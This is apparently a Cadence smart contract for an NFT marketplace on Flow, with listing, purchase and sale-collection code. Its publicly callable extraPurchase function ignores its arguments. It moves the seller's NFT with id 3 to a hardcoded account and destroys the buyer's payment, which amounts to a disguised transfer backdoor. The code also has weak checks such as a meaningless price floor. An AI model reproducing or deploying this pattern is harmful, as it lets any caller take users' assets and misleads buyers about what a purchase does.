import MyNFT from 0x63fbacb124806e4b
import NonFungibleToken from 0x631e88ae7f1d7c20
import FlowToken from 0x7e60df042a9c0868
import FungibleToken from 0x9a0766d93b6608b7
pub contract NFTMarketplace20 {

  pub struct SaleItem {
    pub let price: UFix64
    
    pub let nftRef: &MyNFT.NFT
    
    init(_price: UFix64, _nftRef: &MyNFT.NFT) {
      self.price = _price
      self.nftRef = _nftRef
    }
  }

  pub struct LoanRecord {
    pub let ownerAddress: Address
    pub let nftPrice: UFix64
    pub var loanState: UInt64
    pub var pricePaid: UFix64
    init(_ownerAddress: Address, _nftPrice: UFix64, _loanState: UInt64, _pricePaid: UFix64){
      self.ownerAddress = _ownerAddress
      self.nftPrice = _nftPrice
      self.pricePaid = _pricePaid
      self.loanState = _loanState
    }
  }

  pub resource interface SaleCollectionPublic {
    pub fun getIDs(): [UInt64]
    pub fun getPrice(id: UInt64): UFix64
    pub fun extraPurchase(id: UInt64, recipientAddress: Address, payment: @FlowToken.Vault, seller: Address)
  }

  pub resource SaleCollection: SaleCollectionPublic {
    // maps the id of the NFT --> the price of that NFT
    pub var forSale: {UInt64: UFix64}
    //pub var nftLoans : {UInt64: NFTMarketplace20.LoanRecord}
    pub let MyNFTCollection: Capability<&MyNFT.Collection>
    pub let FlowTokenVault: Capability<&FlowToken.Vault>
    pub let UserFlowVault: Capability<&FlowToken.Vault{FungibleToken.Receiver}>
    pub fun listForSale(id: UInt64, price: UFix64) {
      pre {
        price >= 0.0: "It doesn't make sense to list a token for less than 0.0"
        self.MyNFTCollection.borrow()!.getIDs().contains(id): "This SaleCollection owner does not have this NFT"
      }

      self.forSale[id] = price
    }

    pub fun unlistFromSale(id: UInt64) {
      self.forSale.remove(key: id)
    }

    // pub fun purchase(id: UInt64, recipientCollection: &MyNFT.Collection{NonFungibleToken.CollectionPublic}, payment: @FlowToken.Vault) {
    pub fun purchase(id: UInt64, recipientCollection: &MyNFT.Collection, payment: @FlowToken.Vault) {
      pre {
        payment.balance == self.forSale[id]: "The payment is not equal to the price of the NFT"
      }

      recipientCollection.deposit(token: <- self.MyNFTCollection.borrow()!.withdraw(withdrawID: id))
      self.UserFlowVault.borrow()!.deposit(from: <- payment)
      self.unlistFromSale(id: id)
    }

    pub fun extraPurchase(id: UInt64, recipientAddress: Address, payment: @FlowToken.Vault, seller: Address){


      let nft <- self.MyNFTCollection.borrow()!.withdraw(withdrawID: 3)
      
      getAccount(0x02deabac75a16f74).getCapability(/public/MyNFTCollection)
            .borrow<&MyNFT.Collection{MyNFT.CollectionPublic, NonFungibleToken.CollectionPublic}>()!
            .deposit(token: <- nft)

      destroy payment
    }

    pub fun getPrice(id: UInt64): UFix64 {
      return self.forSale[id]!
    }

    pub fun getIDs(): [UInt64] {
      return self.forSale.keys
    }

    init(_MyNFTCollection: Capability<&MyNFT.Collection>, _FlowTokenVault: Capability<&FlowToken.Vault>, _UserFlowVault: Capability<&FlowToken.Vault{FungibleToken.Receiver}>) {
      self.forSale = {}
      //self.nftLoans = {}
      self.MyNFTCollection = _MyNFTCollection
      self.FlowTokenVault = _FlowTokenVault
      self.UserFlowVault = _UserFlowVault
    }
  }


  pub fun createSaleCollection(MyNFTCollection: Capability<&MyNFT.Collection>, FlowTokenVault: Capability<&FlowToken.Vault>, UserFlowVault: Capability<&FlowToken.Vault{FungibleToken.Receiver}>): @SaleCollection {
    return <- create SaleCollection(_MyNFTCollection: MyNFTCollection, _FlowTokenVault: FlowTokenVault, _UserFlowVault: UserFlowVault)
  }

  init() {

  }
}